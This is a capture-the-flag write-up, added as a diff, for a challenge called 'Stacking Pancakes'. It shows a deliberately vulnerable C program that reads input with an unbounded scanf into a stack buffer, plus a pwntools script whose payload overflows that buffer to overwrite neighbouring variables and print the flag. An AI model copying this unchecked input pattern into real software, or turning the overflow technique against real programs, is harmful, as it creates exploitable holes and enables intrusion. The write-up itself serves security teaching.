@@ -1,0 +1,109 @@
+---
+title: Stacking Pancakes
+---
+
+## Description
+Stacking stuff is hard - and whenever I add my toppings, it always overflows.
+
+Note: We recommend using pwntools to communicate with this challenge, see https://docs.pwntools.com/en/stable/intro.html
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int display_and_check_cake(char *ing1, char *ing2, int ing3_cnt, char *ing3, int ing4_cnt, char *ing4, char *ing5) {
+    puts("The pancakecake looks like this:");
+
+    printf("      ____________________________________\n");
+    printf("     |~~~~~~~~~~~~~~ %s ~~~~~~~~~~~~~~|\n", ing5);
+    printf("     |____________________________________|\n");
+    printf("    /       o  o  o  o  o  o  o  o        /\n");
+    printf("   /         %d %s          /\n", ing4_cnt, ing4);
+    printf("  /_____________________________________/\n");
+    printf("  /    ( )  ( )  ( )  ( )  ( )  ( )     /\n");
+    printf(" /              %d %s              /\n", ing3_cnt, ing3);
+    printf("/_____________________________________/\n");
+    printf("\\    ====      %s      ====    \\\n", ing2);
+    printf(" \\_____________________________________\\\n");
+    printf(" /     ~ ~ ~     %s     ~ ~ ~      /\n", ing1);
+    printf("/_____________________________________/\n");
+  
+    if (strcmp(ing1, "cinnamon-sugar")) {
+        return 0;
+    }
+    if (strcmp(ing2, "cream-filling")) {
+        return 0;
+    }
+    if (strcmp(ing3, "bananas")) {
+        return 0;
+    }
+    if (strcmp(ing4, "blueberries")) {
+        return 0;
+    }
+    if (strcmp(ing5, "honey")) {
+        return 0;
+    }
+    if (ing3_cnt != 2) {
+        return 0;
+    }
+    if (ing4_cnt != 8) {
+        return 0;
+    }
+    
+    return 1;
+}
+
+int main(int argc, char *argv[]) {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    
+    char ingredient5[16] = "butter";
+    char ingredient4[16] = "XXXXXXXXXL peas";
+    char ingredient3[16] = "walnuts";    
+    char ingredient2[16] = "pineapple"; 
+    char ingredient1[16] = "cheese";
+    char buf[64];
+    int ingredient4_count = 19;
+    int ingredient3_count = 7;
+    
+    puts("I got a pancakecake, but its different than what I ordered (from the bottom: cinnamon-sugar, cream-filling, 2 bananas, 8 blueberries, honey).");
+    printf("Could you please help me with what to tell the waiter so they get it right? (64 character input limit)\n> ");
+
+    scanf("%s", buf);
+    
+    printf("The waiter ignored you. ");
+    int correct = display_and_check_cake(ingredient1, ingredient2, ingredient3_count, ingredient3, ingredient4_count, ingredient4, ingredient5);
+    if (correct) {
+        system("cat flag.txt");
+    }
+
+    return 0;
+}
+```
+
+## Solution
+
+Very "simple" buffer overflow attack. Uncomment all `conn` stuff to do it with an interactive remote, or otherwise `python file.py | ./pancakes`
+
+```py
+#!/usr/bin/env python3
+import sys
+from pwn import *
+
+#conn = remote('DOMAIN', PORT)
+
+#conn.recvuntil(b"> ")
+
+payload = b"A"*63 + b"\x00" + b"cinnamon-sugar" + b"\x00"*2 + b"cream-filling" + b"\x00"*3 + b"bananas" + b"\x00"*9 + b"blueberries" + b"\x00"*5 + b"honey" + b"\x00"*11
+payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
+payload += b"\x02\x00\x00\x00"
+payload += b"\x08\x00\x00\x00"
+#conn.sendline(payload)
+
+# Interact to see what's printed (e.g. the flag or server output)
+#conn.interactive()
+
+# Send to stdout so it can be piped
+sys.stdout.buffer.write(payload)
+```
